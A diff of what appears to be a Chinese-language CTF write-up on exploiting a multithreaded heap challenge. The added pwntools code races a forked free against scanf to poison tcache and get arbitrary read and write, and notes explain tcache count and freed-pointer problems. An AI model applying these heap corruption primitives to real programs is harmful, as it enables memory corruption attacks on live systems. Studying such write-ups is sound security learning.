@@ -310,14 +310,39 @@ def arbitrary_read(r1,r2,addr):
         target = p64(addr).split(b"\x00")[0] # fprintf will stop when met \x00
         if output == target:
             break
-    idx += 2
     r1.sendline(b"malloc %d"%(idx+1))
     r1.clean()
     r1.sendline(b"printf %d"%(idx+1))
     r1.recvuntil(b"MESSAGE: ")
     leak = u64(r1.recvline().strip(b"\n").ljust(8,b"\x00"))
+    idx += 2
     return leak
-        
+
+def arbitrary_write(r1,r2,addr,value):
+    global idx
+    print(b"idx: %d"% idx)
+    r1.clean()
+    r2.clean() # clean the recv buffer
+    #context.log_level = 'debug'
+    r1.sendline(b"malloc %d malloc %d free %d" %(idx,idx+1,idx+1))
+    #pause()
+    while True:
+        if os.fork() == 0:
+            r1.sendline(b"free %d" %(idx))
+            os.kill(os.getpid(),9)
+        r2.sendline((b"scanf %d "%(idx)+p64(addr)+b"\n")*2000)
+        os.wait()# wait until the child process ends
+        r1.sendline(b"malloc %d printf %d" %(idx,idx))
+        r1.recvuntil(b"MESSAGE: ")
+        output = r1.recvline().strip(b"\n")
+        target = p64(addr).split(b"\x00")[0] # fprintf will stop when met \x00
+        if output == target:
+            break
+    r1.sendline(b"malloc %d"%(idx+1))
+    r1.clean()
+    r1.sendline(b"scanf %d "%(idx+1)+p64(value))
+    idx += 2
+    return       
 
 pthread_addr = leak_pthread_addr(r1,r2)
 log.success(f"pthread_addr: {hex(pthread_addr)}")
@@ -325,11 +350,19 @@ main_arena_addr_ptr = pthread_addr - 0x40
 log.success(f"main_arena_addr_ptr: {hex(main_arena_addr_ptr)}")
 main_arena_addr = arbitrary_read(r1,r2,main_arena_addr_ptr)
 log.success(f"main_arena_addr: {hex(main_arena_addr)}")
-
+arbitrary_write(r1,r2,main_arena_addr,0x4141414141414141)
+log.success(f"write successfully in {hex(main_arena_addr)}")
 p.interactive()
 ```
-![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250513225213.png)
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250514203400.png)
+这里面其实有两个问题需要解决:<br>
+```
+1. tcache中的counts变量：如果tcache中的counts默认数量不为0，我们的接下来的内存申请会不可用。
+但是没关系，多线程的好处就是我们可以新起一个进程来解决这个问题（每个线程都有自己的tcache metadata）
 
+2. 在通过任意地址读后，现在messages[1]指向了某个非法的chunk，我们无法再释放它。
+通过使用message[3] 来进行后续的利用
+```
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
